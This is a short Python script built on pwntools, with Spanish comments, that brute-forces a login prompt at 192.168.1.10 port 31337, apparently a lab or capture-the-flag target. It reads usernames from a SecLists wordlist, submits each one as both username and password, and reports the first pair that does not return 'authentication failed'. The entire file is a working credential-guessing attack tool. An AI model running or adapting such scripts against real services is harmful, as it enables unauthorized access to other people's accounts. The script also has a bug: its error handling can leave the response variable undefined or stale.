
from pwn import *
import sys, time, pdb, signal

# ctrl + C
def def_handler(sig,frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    
    host, port = "192.168.1.10", 31337
    # pdb.set_trace() #debugger
    
    f = open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", "rb")

    p1 = log.progress("Fuerza bruta")
    p1.status("Starting brute force attack")

    for username in f.readlines():
        username = username.strip()
        # print(username)
        password = username

        p1.status("Testing comb %s:%s" % (username.decode(), password.decode()))
        
        try:
            s = remote(host, port, level='error') # level for dont show err mess

            s.recvuntil(b"username> ")
            s.sendline(username)
            s.recvuntil(b"password> ")
            s.sendline(password)

            response = s.recv()
        
        except:
            None

        if b"authentication failed" not in response:
            p1.success("Founded credentials: %s:%s" % (username.decode(), password.decode()))
            sys.exit(0)

        #  print(response)
        
        # time.sleep(1)



